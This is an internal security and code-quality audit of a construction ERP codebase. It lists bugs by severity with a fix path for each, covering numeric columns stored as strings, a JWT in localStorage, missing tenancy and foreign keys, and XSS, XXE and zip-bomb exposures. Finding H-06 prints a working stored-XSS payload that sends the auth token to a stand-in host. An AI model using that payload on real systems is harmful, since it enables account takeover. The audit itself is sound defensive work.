# ERRORS — Confirmed bugs and gaps

> Each item verified against source. **severity** = critical / high / medium / low / info. All paths are repo-relative.
>
> **Status legend** — `[ ]` pending, `[~]` partial (see `09-changes-log.md`), `[x]` applied in a fix batch.

**Batch 1 (2026-04-18) applied:** L-06, L-05, L-07, L-03, H-06, M-08, M-01, M-06, M-02 (partial — 4 of 8 endpoints).

**Batch 2 (2026-04-18) applied:** L-01, L-02, L-04 (marked intentional, not a bug), M-03, M-04 (procurement + finance enrichment), M-07, M-09, H-07. See `09-changes-log.md` for detail and verification.

---

## CRITICAL — data integrity / XSS amplifier

### C-01 Money / quantity / rate columns stored as `String(50)` across the whole platform
- **Pattern**: every numeric financial / quantity column in `backend/app/modules/*/models.py` is declared as `Mapped[str] = mapped_column(String(50), ...)`.
- **Affected**: `quantity`, `unit_rate`, `total` (BOQ positions), `amount_total`, `tax_amount`, `amount_subtotal` (PO), `bac`, `pv`, `ev`, `ac` (EVM), `cost_impact` (NCR / risk), `amount` (invoices / payments), `rate`, `factor` (assemblies), `area`, `volume`, `length` (BIM canonical quantities) — ~220 columns total across 37 modules.
- **Stated reason** (from comments in `boq/models.py` and others): SQLite has no native `Numeric` type, so using `Decimal` via SQLAlchemy is tricky in dev.
- **CLAUDE.md says**: `Position.quantity: Decimal`, `unit_rate: Decimal`, `total: Decimal (computed: quantity × unit_rate)`.
- **Impact**:
  - `SELECT SUM(total)` against Postgres concatenates strings instead of adding (unless CAST applied every time).
  - No DB-side validation — a write of `"abc"` into `total` succeeds.
  - All rounding happens in Python; any service that skips conversion drops precision.
  - Reporting pipelines (DuckDB, Parquet exports) need every column cast.
- **Fix path**: move to `Numeric(precision, scale)` on Postgres + `Float` shim on SQLite (SQLAlchemy's `Numeric` type maps to `NUMERIC` on PG and to `DECIMAL` stored as TEXT on SQLite — still comparable). Needs a migration + backfill pass. This is a multi-module change and should not be applied in the fix batch without plan approval.

### C-03 JWT stored in `localStorage` (amplifies every XSS)
- **File**: `frontend/src/stores/useAuthStore.ts` (persist middleware writes the token under key `auth-storage` in localStorage).
- **Impact**: any stored-XSS vector (H-06) can read the token and impersonate the user. With an httpOnly cookie, the same XSS would at best trigger CSRF (which our CORS + SameSite posture should block anyway).
- **Trade-off**: moving to httpOnly cookies means the frontend cannot read the token for manual Authorization headers — requires a small auth-middleware change and CSRF-token handling.
- **Fix path**: not a small edit. Log as a high-priority backlog; in the meantime H-06 must be fixed to close the actual exploit path.

### C-02 `Base.metadata.create_all()` runs at startup on both SQLite and PostgreSQL
- **File**: `backend/app/main.py:1060-1126` — startup calls `create_all()` unconditionally when `sqlite` or `postgresql` is in `database_url`. Comment at 1050-1058 explains why: the v0.9.0 baseline Alembic migration (`129188e46db8_init_create_all_tables.py`) is a **no-op placeholder**. docker-compose quickstart doesn't run `alembic upgrade head`, so without `create_all()` a fresh PG volume would fail with "`relation \"oe_users_user\" does not exist`".
- **Consequence of this workaround**:
  - Adding a **new table** in code → created automatically on next startup. OK.
  - Adding a **new column** to an existing table → `create_all()` does NOT alter existing tables. On PG this silently does nothing, then the app queries the missing column at runtime and fails. On SQLite, `sqlite_auto_migrate()` (line 1118) patches columns in place — dev convenience that masks the problem.
  - Dev and prod can thus drift on column-level changes.
- **Secondary smell**: lines 1062-1112 explicitly `import ... # noqa: F401` every module's `models` to force metadata registration — 50+ import lines that have to be kept in sync manually. A new module added without updating this block silently loses its tables on fresh PG deploys.
- **Fix path**: generate a baseline Alembic migration from the current model set, add a startup check that refuses to boot on PG when `alembic current` is stale. Keep `create_all()` in a DEV_MODE branch only. Move the 50-line import block into `module_loader` so it's driven by the manifest list.

---

## HIGH — load-bearing architecture gaps

### H-01 `cad` module is a stub — takeoff depends on nothing
- **File**: `backend/app/modules/cad/` — contains only `__init__.py`, `manifest.py`, `classification_mapper.py`. No `router.py` / `models.py` / `service.py` / `schemas.py`.
- **Dependency**: `backend/app/modules/takeoff/manifest.py:depends=["oe_projects","oe_cad"]` — `oe_cad` resolves, but the loader logs `"No router for module cad"` at DEBUG level and moves on.
- **Impact**: `CLAUDE.md` lists `cad` as a core module for the DWG/DGN/RVT/IFC → canonical-format conversion pipeline. Reality: BIM ingestion logic lives in `bim_hub/` (full CRUD surface), DWG-specific logic in `dwg_takeoff/`. The `cad` module is an empty shell except for `classification_mapper.py`.
- **Fix path**: either (a) promote `classification_mapper.py` to `backend/app/core/` and drop the empty module, OR (b) flesh out `cad/` into a thin façade over DDC cad2data as documented. Takeoff's `depends=["oe_cad"]` should be removed if we go with (a).

### H-02 Missing validation rule sets claimed in CLAUDE.md
- **CLAUDE.md** table "Built-in rule sets" lists `bim_compliance`, `project_completeness`, `custom`.
- **Grep** `bim_compliance|project_completeness` across `backend/` returns **zero matches**.
- **File**: `backend/app/core/validation/rules/__init__.py` registers 14 rule sets, but these three are not among them.
- **Impact**: documented product feature is missing. Validation UI that filters by these rule-set names will show empty results.
- **Fix path**: either implement the missing rule sets (each set needs ≥2 rules to be useful) or remove the rows from `CLAUDE.md`.

### H-03 i18n bundle ships 50k lines as a single JS file
- **File**: `frontend/src/app/i18n-fallbacks.ts` — 50,513 lines, a single TypeScript constant containing all 21 locales.
- **CLAUDE.md claim**: "Новый язык = JSON-файл" — implying `frontend/public/locales/{code}/translation.json`, loaded lazily by `i18next-http-backend`.
- **Reality**: there is no `public/locales/` directory; the entire dictionary is a hard-import in the main bundle.
- **Impact**: (a) every user downloads 21 locales they'll never read, (b) adding a new language requires editing a giant source file rather than dropping in a JSON.
- **Fix path**: split into per-language JSON files, load via `i18next-http-backend`, or at minimum lazy-import chunks per locale.

### H-04 i18n coverage drift for 18 of 20 locales
- **File**: `frontend/src/app/i18n-fallbacks.ts` — key counts per locale:
  - `en` 3,268 (baseline), `de` 3,025 (92.6%), `ru` 2,985 (91.3%)
  - all 18 others: ~2,250 (69–72%) — ~1,000 missing keys each
- **Pattern**: the BIM / CDE / Reports / Data Explorer / Integrations / Users / Onboarding / regional-nav blocks were added after a historical bulk-translate and were never re-run.
- **Impact**: product is "translated" but large parts of the UI render in English for Chinese / Arabic / Polish / Korean / Japanese etc. users. Undermines the "20 languages bundled" pitch.
- **Fix path**: machine-translate the ~1,000-key delta × 18 locales, review by native speaker where possible, merge back into the source-of-truth file.

### H-05a Multi-tenancy: 98 % of tables have no `org_id`
- **Inventory**: only 2 of 86 tables (`oe_collab_lock`, `oe_bim_quantity_map`) have an `org_id` column, and neither is FK-constrained.
- **`oe_organizations` table**: does not exist. No Organization model anywhere.
- **Impact**: there is no row-level isolation across tenants. All separation is done implicitly by `project_id`. Any future hosted-SaaS deploy will have to retrofit `org_id` on every write surface + PG RLS policies — that's a multi-week task touching all 37 modules.
- **Fix path**: design decision — if OpenConstructionERP is self-hosted-only, this is fine; if SaaS is on the roadmap, add org_id now while the schema is still small.

### H-05b `~15` modules store `project_id` as loose GUID — orphan row risk
- **Missing FKs**: `bim_hub`, `validation`, `tendering`, `rfq_bidding`, `procurement`, `finance`, `reporting`, `ai`, `erp_chat`, `transmittals`, schedule `baselines` + `progress`, integrations configs, `enterprise_workflows`.
- **Impact**: deleting a project leaves orphans across the above tables. Restoring or garbage-collecting gets hard.
- **Fix path**: add `ForeignKey("oe_projects_project.id", ondelete="CASCADE")` in each (guard against circular imports with a string reference).

### H-05c Inconsistent `ondelete` across user FKs
- **Examples**:
  - `Project.owner_id` → `users.id` with `ondelete="CASCADE"` — deleting a user wipes their projects.
  - `Contact.user_id` → `users.id` with `ondelete="SET NULL"` — deleting a user preserves the contact.
  - 40+ tables use `String(36)` for `created_by` with no FK at all — the audit trail is just a string.
- **Impact**: depending on the deletion path, some data survives and some doesn't. Accidental user delete = data loss.
- **Fix path**: decide the policy (almost certainly `SET NULL` for `created_by`, `CASCADE` only for "owned-by" relations), enforce uniformly, convert String(36) to proper FKs.

### H-05d No model mixins — copy-pasted `id`/`created_at`/`updated_at`
- **CLAUDE.md claim**: `AuditMixin`, `OrgMixin`, `TimestampMixin`.
- **Reality**: `backend/app/database.Base` bakes `id`, `created_at`, `updated_at` into every model. Grep for `AuditMixin`/`OrgMixin`/`TimestampMixin` returns zero hits.
- **Impact**: documentation drift; no opt-out. Fine today, but the docs mislead new contributors who try to import the mixins.
- **Fix path**: either introduce real mixins and migrate models, or delete the mention from CLAUDE.md.

### H-06 `[x]` XSS in PDF BOQ export — JWT exfiltration possible
- **File**: `frontend/src/modules/_shared/pdfBOQExport.ts:32-41, 61-63, 91`
- **Pattern**: BOQ position fields (`ordinal`, `description`, `unit`) and template fields (`projectName`, `boqName`, `classification`) are interpolated raw into HTML template literals, then the result is written via `win.document.write(html)` into a new same-origin popup window (line 91).
- **Attack vector**: in a collaborative project (shared BOQ with teammates), an attacker with BOQ edit access plants a payload like `description = "<img src=x onerror=\"fetch('//evil.example/'+localStorage.getItem('auth-token'))\">"`. When a teammate clicks the "Print PDF" button, the payload executes in the same origin and can read the JWT from `localStorage` (C-03 below).
- **Impact**: HIGH — account takeover via stored XSS in a shared feature.
- **Fix path**: add a `htmlEscape(s)` helper (`&` `<` `>` `"` `'` → entities), wrap every `${...}` that originates from a position field. One function, ~10 call sites inside this file.

### H-07 `[x]` Nginx CSP duplicates and conflicts with backend CSP
- **Files**:
  - `deploy/docker/nginx.conf` (line ~10) — sets its own `Content-Security-Policy` header
  - `backend/app/middleware/security_headers.py:38-54` — also sets CSP
- **Conflict points**: different `frame-ancestors` (`'self'` vs `'none'`), Nginx is missing the google-analytics/tagmanager hosts so analytics snippets break in production, backend uses `setdefault` which means whichever gets there last wins — depends on proxy order.
- **Impact**: security policy is unpredictable. Analytics may be silently blocked or frame-ancestors bypass may be wider than intended.
- **Fix path**: delete the `Content-Security-Policy` header block from `nginx.conf`; let the backend middleware own it. Keep Nginx for TLS + gzip + rate-limiting only.

### H-08 Pluralization not implemented
- **Pattern**: 853 `{{count}}` interpolations in frontend code. Zero i18next `_one` / `_other` CLDR-suffix keys.
- **Impact**: "1 items generated" / "1 проекта создано" / "1 زبون" — ungrammatical in EN, RU, AR, PL, CS, DE, FR, ES, PT, IT.
- **Fix path**: add `_one`/`_other` (and `_few`/`_many` for RU/AR/PL/UK) variants for the top 20 count-bearing messages.

---

## MEDIUM — confirmed bugs

### M-01 `[x]` `/api/v1/feedback` public + no rate limit
- **File**: `backend/app/main.py` (line ~955) — accepts arbitrary category/subject/description/email/page_path, writes to SQLite `oe_feedback` table.
- **Gap**: no auth, no CAPTCHA, no IP-based rate limit (contrast: `users/router.py::register` uses `login_limiter.is_allowed(f"reg_{client_ip}")`).
- **Impact**: trivial spam/DoS vector on production.
- **Fix path**: add `login_limiter.is_allowed(f"fb_{client_ip}")` (same pattern as register), cap body size at 10 KB.

### M-02 `[~]` System introspection endpoints publicly unauthenticated
- **Files**: `backend/app/main.py` inline routes:
  - `/api/system/status` — leaks DB engine (`sqlite`/`postgresql`), vector backend, configured AI provider names
  - `/api/system/modules` — duplicates `/api/v1/modules` listing
  - `/api/system/validation-rules` — full rule-ID list
  - `/api/system/hooks` — framework hook inventory
  - `/api/marketplace` — module catalog
  - `/api/demo/catalog` + `/api/demo/status` — installed demo IDs (may leak tenant state)
- **Plus core router** `GET /api/v1/modules/`, `/api/v1/modules/{name}`, `/api/v1/modules/dependency-tree/{name}` — no auth on reads.
- **Impact**: fingerprinting surface. Not directly exploitable, but a gift to anyone probing the stack.
- **Fix path**: add `Depends(get_current_user_id)` on every `/api/system/*` except `/api/health` and `/api/source` (which must stay public — liveness + AGPL compliance).

### M-03 `[x]` Prefix collision `/api/v1/search`
- **Files**:
  - `backend/app/core/global_search_router.py` — `APIRouter(prefix="/api/v1/search")` (1 endpoint, cross-module)
  - `backend/app/modules/search/router.py` — auto-mounted at `/api/v1/search` by module loader (3 endpoints)
- **Current state**: works because the two routers have distinct child paths; `main.py` mounts the core router first and the module-loader runs the search module later during `on_event("startup")` so registrations don't clash.
- **Risk**: adding a route in one that overlaps with the other is undetectable at startup and will silently shadow.
- **Fix path**: rename the module's prefix to `/api/v1/search-module` OR merge both into a single router.

### M-04 `[x]` Missing backend enrichment: vendor_name / counterparty_name
- **Files**: `backend/app/modules/procurement/schemas.py::POResponse` exposes `vendor_contact_id` but not a resolved `vendor_name`; `backend/app/modules/finance/schemas.py::InvoiceResponse` exposes `contact_id` but not `counterparty_name`.
- **Frontend workaround**: v1.9.5 normaliser falls back to `vendor_contact_id` (a UUID) when `vendor_name` is missing. User sees a UUID instead of a vendor name.
- **Impact**: ugly UX on PO and Invoice lists.
- **Fix path**: join contacts in `service.list_pos()` / `service.list_invoices()` and populate the resolved name into the response (same pattern as `tasks.assigned_to_name`).

### M-05 CSP has `unsafe-inline` + `unsafe-eval` in `script-src`
- **File**: `backend/app/middleware/security_headers.py:40-43` — both directives together neuter most CSP XSS protection.
- **Why they're there**: Vite / AG Grid / some dependency uses `new Function(...)` for runtime template compile; React's analytics bootstrap uses inline scripts.
- **Impact**: any reflected/stored XSS (like H-06) runs without CSP friction. With a nonce-based policy, H-06 would be blocked at browser level.
- **Fix path**: multi-step — (a) generate per-request nonce in middleware, (b) inject nonce into Vite's `index.html` build output, (c) replace `'unsafe-inline'` with `'nonce-<val>'`. `unsafe-eval` removal requires auditing `new Function()` usage — defer to a second pass.

### M-06 `[x]` XML parsers use stdlib `xml.etree` — XXE / zip-bomb exposure
- **Files**:
  - `backend/app/modules/schedule/router.py:1222-1244, 1457-1482` — XER / MSP XML import
  - `backend/app/modules/boq/router.py:2481` — GAEB XML import
  - `backend/app/modules/bim_requirements/parsers/ids_parser.py:1` — IDS parser
- **Modern Python ≥ 3.7.1** blocks XXE external entity expansion by default, but **deeply-nested element DoS** still works against `xml.etree.ElementTree.fromstring`. No file size caps on the XER / MSP import means an attacker uploads a 500 MB XML and fills memory.
- **Fix path**: switch to `defusedxml.ElementTree.fromstring` + add a 10 MB body cap on all three endpoints.

### M-07 `[x]` `.xlsx` import paths accept unbounded uncompressed size (zip-bomb)
- **Files**: `backend/app/modules/finance/router.py:613-632`, `backend/app/modules/fieldreports/router.py:443-460`, `backend/app/modules/contacts/router.py:446`, `backend/app/modules/boq/router.py:2864-2884` — accept `.xlsx` with 10 MB cap on **compressed** size.
- **Risk**: openpyxl materialises the full uncompressed sheet; a 10 MB xlsx can expand to 10 GB of XML (billion-laughs-via-zip).
- **Fix path**: before calling openpyxl, `zipfile.ZipFile(file).infolist()` and sum `uncompressed_size` — reject if > 50 MB.

### M-08 `[x]` Punchlist photo upload — no size cap
- **File**: `backend/app/modules/punchlist/router.py:256-290` — MIME whitelist but no `MAX_PHOTO_SIZE` guard.
- **Impact**: any logged-in user with `punchlist.update` permission can fill disk by uploading arbitrarily large files.
- **Fix path**: add the 50 MB cap from `documents/service.py::MAX_PHOTO_SIZE`.

### M-09 `[x]` Document/BIM/PDF uploads not rate-limited
- **Files**: `backend/app/modules/documents/router.py:111-140`, `backend/app/modules/bim_hub/router.py:1221+`, `backend/app/modules/takeoff/router.py:2205+`
- **Impact**: each upload = memory + disk + background tasks. A single authenticated user can flood 1000× 100 MB in 60s = 100 GB writes.
- **Fix path**: apply `approval_limiter` (20/min) to upload endpoints, or add a dedicated `upload_limiter`.

### M-10 `RequirePermission` admin bypass relies on JWT claim only
- **File**: `backend/app/dependencies.py:197-201` — if `payload["role"] == "admin"` the check returns True without DB lookup.
- **Impact**: if the JWT_SECRET ever leaks, attacker mints a token with `role="admin"` and gets full bypass. Mitigated today by the startup guard at `backend/app/main.py:1024-1030` (refuses prod boot with dev secret).
- **Fix path**: defence-in-depth — in `get_current_user_payload`, also `SELECT user.role FROM users WHERE id = payload.sub` once per request (one indexed lookup). Expensive but closes the leak path.

### M-11 Single 1,768-LOC validation rules file
- **File**: `backend/app/core/validation/rules/__init__.py` — all 43+ rules in one module.
- **CLAUDE.md architecture** shows `rules/din276.py`, `rules/nrm.py`, `rules/masterformat.py`, `rules/gaeb.py`, `rules/custom.py` as separate files.
- **Impact**: hygiene issue; diff reviews are noisy, merge conflicts likely when adding rules in two regions simultaneously.
- **Fix path**: split by standard (one file per rule set), keep `__init__.py` as the registrar.

---

## LOW — cosmetic / consistency

### L-01 `[x]` Public regional pack `/config/` endpoints (9 routers)
- **Files**: `us_pack`, `uk_pack`, `dach_pack`, `india_pack`, `russia_pack`, `middle_east_pack`, `latam_pack`, `asia_pac_pack` — each exposes `GET /config/` with no auth.
- **Payload**: static dict of regional classifications / VAT rates / currency.
- **Impact**: not sensitive, but inconsistent with the rest of the platform (which all require auth).
- **Fix path**: add `Depends(get_current_user_id)` for consistency, OR keep public and document the intent at the top of each router file.

### L-02 `[x]` `architecture_map` fully public
- **File**: `backend/app/modules/architecture_map/router.py` — 6 GET endpoints serving `architecture_manifest.json`.
- **Impact**: exposes the module graph (names, connections, tags). No secrets, but unnecessary for a logged-out user.
- **Fix path**: same as L-01, add auth for consistency.

### L-03 `[x]` `audit_router` type-ignore on CurrentUserId default
- **File**: `backend/app/core/audit_router.py:37` — `_user_id: CurrentUserId = None,  # type: ignore[assignment]`
- **Impact**: the `= None` default can never bind because FastAPI resolves the dependency; the `type: ignore` is dead. Adds confusion.
- **Fix path**: drop the `= None` — it doesn't do anything.

### L-04 (intentional — see N-04) Duplicate auth endpoints (trailing-slash forms)
- **File**: `backend/app/modules/users/router.py` — registers both `/auth/login/` and `/auth/login` (latter with `include_in_schema=False`), same for `register`, `refresh`.
- **Cause**: `FastAPI(redirect_slashes=False)` in main.py:479, so both forms must be explicitly registered if the frontend sometimes omits the trailing slash.
- **Impact**: harmless duplication in OpenAPI schema.
- **Fix path**: audit the frontend API client — if it always sends a consistent form, drop the other.

### L-05 `[x]` Dead code: DashboardPage.backup.tsx + RequirementsPage.tsx
- **Files**:
  - `frontend/src/features/dashboard/DashboardPage.backup.tsx` — 2,667 LOC, backup copy never imported
  - `frontend/src/features/requirements/RequirementsPage.tsx` — 2,269 LOC; route `/requirements` already redirects to `/bim/rules` elsewhere in App.tsx
- **Impact**: ~5,000 LOC of dead TypeScript, slower builds, confusing IDE auto-complete suggestions.
- **Fix path**: delete both. Confirm no imports first (they're known orphans from the frontend inventory pass).

### L-06 `[x]` Brace-expansion junk directories in repo
- **Found via `find . -name "*{*"`**:
  - `./backend/tests/{unit,integration,fixtures}`
  - `./data/{cwicr,classifications,seeds}`
  - `./deploy/{docker,kubernetes,terraform}`
  - `./docs/{architecture,api,module-development,user-guide}`
  - `./frontend/src/features/{projects,boq,takeoff,cad,costs,validation,tendering,reporting}`
  - `./frontend/src/shared/{ui,hooks,lib}`
  - `./frontend/src/{app,features/{projects,boq,takeoff,cad,costs,validation,tendering,reporting},shared`
  - `./packages/{oe-schema,oe-sdk,oe-ui-kit}`
  - `./services/cad-converter/{oda-bridge,rvt-parser`
- **Root cause**: someone ran `mkdir packages/{a,b,c}` style commands in a shell that doesn't brace-expand (PowerShell, or bash with quoted args). Literal directory names got created.
- **Impact**: zero functional impact (files go into real directories), but every recursive tool (grep, glob, test discovery) wastes cycles on them, and they confuse new contributors.
- **Fix path**: `find . -type d -name '*{*' -print0 | xargs -0 rm -rf` — must verify each is empty first.

### L-07 `[x]` Backend `tenacity` dependency declared but not imported
- **File**: `backend/pyproject.toml` — `tenacity` in `dependencies = [...]`.
- **Grep**: `from tenacity` / `import tenacity` — zero hits across `backend/`.
- **Fix path**: remove from `pyproject.toml`, regenerate lockfile.

### L-08 48 files > 1,500 LOC — top 5 are red-line
- **Top of list** (LOC):
  - `backend/app/core/demo_projects.py` — 7,843
  - `backend/app/modules/boq/router.py` — 4,844
  - `backend/app/modules/boq/service.py` — 3,993
  - `frontend/src/features/dwg-takeoff/DwgTakeoffPage.tsx` — 3,715
  - `frontend/src/features/ai/QuickEstimatePage.tsx` — 3,506
- **`demo_projects.py`** holds five demo fixtures inline (Residential Berlin, Office London, etc.). Split into `demo_projects/{residential_berlin.py,...}` each ≤1.5k.
- **BOQ router/service** — the CRUD plus the auto-generated lookups plus assembly application all in one file. Real multi-module refactor work; defer to backlog.
- **Frontend giants** — each is a mini-app with its own local hooks. Refactor-when-touched policy recommended.

### L-09 CLAUDE.md drift — root + .claude duplicates, scaffold copies stale
- **Near-duplicates**: `./CLAUDE.md` (642 LOC) and `./.claude/CLAUDE.md` (641 LOC) are 99 % identical.
- **Stale scaffolds**: `./backend/CLAUDE.md`, `./frontend/CLAUDE.md`, `./services/cad-converter/CLAUDE.md`, `./services/cv-pipeline/CLAUDE.md` untouched since initial commit (repo now v1.9.5, scaffolds still say "Phase 0 — current").
- **Dead references**: docs cite `backend/app/core/validation/rules/din276.py` / `nrm.py` / `masterformat.py` / `gaeb.py` / `custom.py` — all inlined into `rules/__init__.py` (see M-11). References to `packages/oe-schema`, `packages/oe-sdk`, `packages/oe-ui-kit` — these never existed (they're inside the brace-junk from L-06).
- **Fix path**: make `.claude/CLAUDE.md` a one-line pointer to `./CLAUDE.md`; update the root to reflect current phase / real module layout; delete the stale scaffold copies OR update them.

### L-10 Duplicate patterns flagged by hygiene scan
- `new Intl.NumberFormat(` — **38 files** inline the constructor despite `shared/lib/formatters.ts::getIntlLocale()` existing. Consistency risk (5 of those use `undefined` / `en-US` / `de-DE` hardcoded locales — see i18n report L6).
- Ad-hoc empty-state rendering — **49 files** despite `shared/ui/EmptyState.tsx` existing. Adds visual inconsistency noted in the mobile audit.
- Inline `isLoading/isError/if (!data)` boilerplate — **~200 LOC** estimated. Candidate for a `<QueryBoundary>` wrapper component.

### L-11 Dead exports — ~106 confirmed orphans
- `ts-prune` reports 329 unused exports; filtering barrel re-exports leaves ~106.
- Hot spots: `features/bim/api.ts` (10+ never-imported fetchers), `features/boq/boqHelpers.ts` (9 dead helpers), `features/erp-chat/api.ts`, `features/dwg-takeoff/api.ts`, `features/documents/api.ts`.
- **Fix path**: manual review + delete; low risk, mechanical work.

### L-12 Test coverage very low (~8% frontend / ~13% backend)
- Count: 45 vitest files / 537 source files (frontend), 74 pytest files / 547 py files (backend). Heuristic — not a real coverage percentage.
- **No `--coverage` in CI**: the `Quality gates` block in `CHANGELOG.md` reports `Vitest: 609 passed` but never prints a coverage number.
- **Risk**: large refactors (C-01 String→Numeric, or BOQ router split) have no safety net.
- **Fix path**: `vitest run --coverage` + `pytest --cov=app` in CI; block PR if coverage drops. Start with a baseline commit.

### L-13 Frontend giants (covered by L-08)
See L-08 above.

---

## INFO — no action required

- **N-01** Phantom route `/analytics` in App.tsx has no matching backend `analytics` module. Route renders a component that calls other modules' aggregation endpoints; not a bug.
- **N-02** `/modules` route is Zustand-only (no backend endpoint) — correct by design; it manages client-side module state.
- **N-03** `/requirements` frontend route was intentionally redirected to `/bim/rules` in v1.9.4 (see CHANGELOG). Backend `requirements` module still serves `/api/v1/requirements` — that's used by CDE module internally, not dead.
- **N-04** `L-04` duplicate auth endpoints are deliberate per `backend/app/modules/users/router.py:103-109` comment — some Docker quickstart reverse-proxies drop the trailing slash, so both forms are registered. Not a bug.

---

## Cross-references to phase reports

Findings below have their own dedicated audit file — not duplicated in ERRORS.md to keep the numbering stable.

- **Phase 3 (`03-cross-module.md`)** — 6 metric-drift items:
  - `X-01` (CRITICAL): BOQ grand total on dashboard (`projects/router.py:1041-1057`) sums positions only; detail pages apply markups (`boq/repository.py:56-110`). Same BOQ shows two different totals.
  - `X-02` (HIGH): Validation score formulas differ — `core/validation/engine.py:122-135` weighted (ERROR 3.0, WARNING 1.5, INFO 0.4) vs `validation/bim_validation_service.py:174` simple pass/total ratio.
  - `X-03` (HIGH): Dashboard "quality score" (completeness %) ≠ validation score (rule-weighted) — same label, different meaning.
  - `X-04` (HIGH): Portfolio cost rollup sums multi-currency budgets without FX conversion (`projects/router.py:1237-1255`).
  - `X-05` / `X-06` (MED): Dashboard hard-codes open-tasks / open-RFIs status filters while detail pages let the user pick.
- **Phase 4 (`04-contract.md`)** — API wire-shape drift in 6 modules:
  - `Tasks` (HIGH): checklist shape mismatch — backend `list[dict]`, frontend `ChecklistItem[]` with different field names.
  - `FieldReports` (MED): workforce entries returned as loose dicts.
  - `Punchlist` (MED): frontend defensively unwraps both `[]` and `{items: []}` forms.
  - `Documents` (MED): `Document.name` vs `Photo.filename` — inconsistent key naming.
  - `BOQ` (MED): `metadata_` validation alias creates asymmetric naming.
  - `Schedule` (LOW): optional unused fields in response schema.
- **Phase 7 (`07-data.md`)** — 9 data-layer findings (D-01 .. D-11), summary banner at top of that file.
